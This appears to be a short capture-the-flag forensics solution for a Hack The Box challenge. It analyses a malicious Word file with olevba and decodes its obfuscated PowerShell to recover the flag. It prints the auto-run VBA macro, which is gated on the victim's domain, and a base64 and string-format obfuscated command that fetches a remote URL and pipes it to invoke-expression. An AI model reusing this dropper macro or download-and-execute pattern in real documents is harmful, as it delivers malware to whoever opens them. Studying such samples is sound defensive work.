'''
pip3 install oletools

olevba UrgentPayment.doc
olevba 0.60.1 on Python 3.6.9 - http://decalage.info/python/oletools
===============================================================================
FILE: UrgentPayment.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: UrgentPayment.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas
in file: UrgentPayment.doc - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub Document_Open()
'
' Document_Open Macro
'
'

Dim chkUserDomain As String
Dim strUserDomain As String

chkUserDomain = "MEGABANK.LOCAL"
strUserDomain = Environ$("UserDomain")

If chkUserDomain <> strUserDomain Then

Else

Dim ExecFile As Double
    ExecFile = Shell("pOweRshElL -ec cABPAHcARQByAHMAaABFAGwATAAgACQAKAAtAGoATwBpAE4AKAAoACQAUABzAGgATwBNAGUAWwA0AF0AKQAsACgAIgAkAFAAcwBIAG8ATQBFACIAKQBbACsAMQA1AF0ALAAiAHgAIgApADsAKQAoAGkAdwByACAAJAAoACgAIgB7ADUAfQB7ADIANQB9AHsAOAB9AHsANwB9AHsAMAB9AHsAMQA0AH0AewAzAH0AewAyADEAfQB7ADIAfQB7ADIAMgB9AHsAMQA1AH0AewAxADYAfQB7ADMAMQB9AHsAMgA4AH0AewAxADEAfQB7ADIANgB9AHsAMQA3AH0AewAyADMAfQB7ADIANwB9AHsAMgA5AH0AewAxADAAfQB7ADEAfQB7ADYAfQB7ADIANAB9AHsAMwAwAH0AewAxADgAfQB7ADEAMwB9AHsAMQA5AH0AewAxADIAfQB7ADkAfQB7ADIAMAB9AHsANAB9ACIALQBmACAAIgBCACIALAAiAFUAIgAsACIANAAiACwAIgBCACIALAAiACUANwBEACIALAAiAGgAdAAiACwAIgBSAF8AZAAiACwAIgAvAC8AbwB3AC4AbAB5AC8ASABUACIALAAiAHAAOgAiACwAIgBUACIALAAiADAAIgAsACIAXwAiACwAIgBOACIALAAiAE0AIgAsACIAJQA3ACIALAAiAEUAIgAsACIAZgAiACwAIgAxAFQAIgAsACIAdQAiACwAIgBlACIALAAiADUAIgAsACIAawAiACwAIgBSACIALAAiAGgAIgAsACIAMAAiACwAIgB0ACIALAAiAHcAIgAsACIAXwAiACwAIgBsACIALAAiAFkAIgAsACIAQwAiACwAIgBVACIAKQApACkA", vbNormalFocus)

End If

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|pOweRshElL          |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+


echo cABPAHcARQByAHMAaABFAGwATAAgACQAKAAtAGoATwBpAE4AKAAoACQAUABzAGgATwBNAGUAWwA0AF0AKQAsACgAIgAkAFAAcwBIAG8ATQBFACIAKQBbACsAMQA1AF0ALAAiAHgAIgApADsAKQAoAGkAdwByACAAJAAoACgAIgB7ADUAfQB7ADIANQB9AHsAOAB9AHsANwB9AHsAMAB9AHsAMQA0AH0AewAzAH0AewAyADEAfQB7ADIAfQB7ADIAMgB9AHsAMQA1AH0AewAxADYAfQB7ADMAMQB9AHsAMgA4AH0AewAxADEAfQB7ADIANgB9AHsAMQA3AH0AewAyADMAfQB7ADIANwB9AHsAMgA5AH0AewAxADAAfQB7ADEAfQB7ADYAfQB7ADIANAB9AHsAMwAwAH0AewAxADgAfQB7ADEAMwB9AHsAMQA5AH0AewAxADIAfQB7ADkAfQB7ADIAMAB9AHsANAB9ACIALQBmACAAIgBCACIALAAiAFUAIgAsACIANAAiACwAIgBCACIALAAiACUANwBEACIALAAiAGgAdAAiACwAIgBSAF8AZAAiACwAIgAvAC8AbwB3AC4AbAB5AC8ASABUACIALAAiAHAAOgAiACwAIgBUACIALAAiADAAIgAsACIAXwAiACwAIgBOACIALAAiAE0AIgAsACIAJQA3ACIALAAiAEUAIgAsACIAZgAiACwAIgAxAFQAIgAsACIAdQAiACwAIgBlACIALAAiADUAIgAsACIAawAiACwAIgBSACIALAAiAGgAIgAsACIAMAAiACwAIgB0ACIALAAiAHcAIgAsACIAXwAiACwAIgBsACIALAAiAFkAIgAsACIAQwAiACwAIgBVACIAKQApACkA|base64 -d
pOwErshElL $(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)(iwr $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")))

pwsh
PowerShell 7.3.6
PS /home/szhan21/ctf/htb/ctf/forensics/Lure> $test = ("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")
PS /home/szhan21/ctf/htb/ctf/forensics/Lure> write-output $test                                                                                                                     http://ow.ly/HTB%7Bk4REfUl_w1Th_Y0UR_d0CuMeNT5%7D

HTB{k4REfUl_w1Th_Y0UR_d0CuMeNT5}
'''
